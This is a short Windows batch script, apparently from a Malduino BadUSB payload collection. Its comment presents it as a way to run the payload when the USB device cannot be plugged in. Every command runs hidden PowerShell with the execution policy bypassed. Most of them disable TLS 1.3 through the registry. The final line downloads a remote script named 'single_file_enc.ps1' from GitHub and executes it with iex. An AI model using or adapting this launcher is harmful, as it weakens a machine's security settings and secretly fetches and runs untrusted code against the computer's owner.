rem save this .bat on the windows computer when is not possible to connect the USB Malduino

rem change the drive letter if needed
d:

powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden "(New-Item 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.3\Server' -Force) | iex"

powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden "(New-ItemProperty -path 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.3\Server' -name 'Enabled' -value '0' -PropertyType 'DWord' -Force) | iex"

powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden "(New-ItemProperty -path 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.3\Server' -name 'DisabledByDefault' -value 1 -PropertyType 'DWord' -Force) | iex"

powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden "(New-Item 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.3\Client' -Force) | iex"

powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden "(New-ItemProperty -path 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.3\Client' -name 'Enabled' -value '0' -PropertyType 'DWord' -Force) | iex"

powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden "(New-ItemProperty -path 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.3\Client' -name 'DisabledByDefault' -value 1 -PropertyType 'DWord' -Force) | iex"

powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden "(reg add HKLM\SOFTWARE\Microsoft\.NETFramework\v4.0.30319 /v SystemDefaultTlsVersions /t REG_DWORD /d 1 /f /reg:64) | iex"

powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden "(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/pcmarcon/malduino-payload-samples/master/single_file_enc.ps1') | iex"
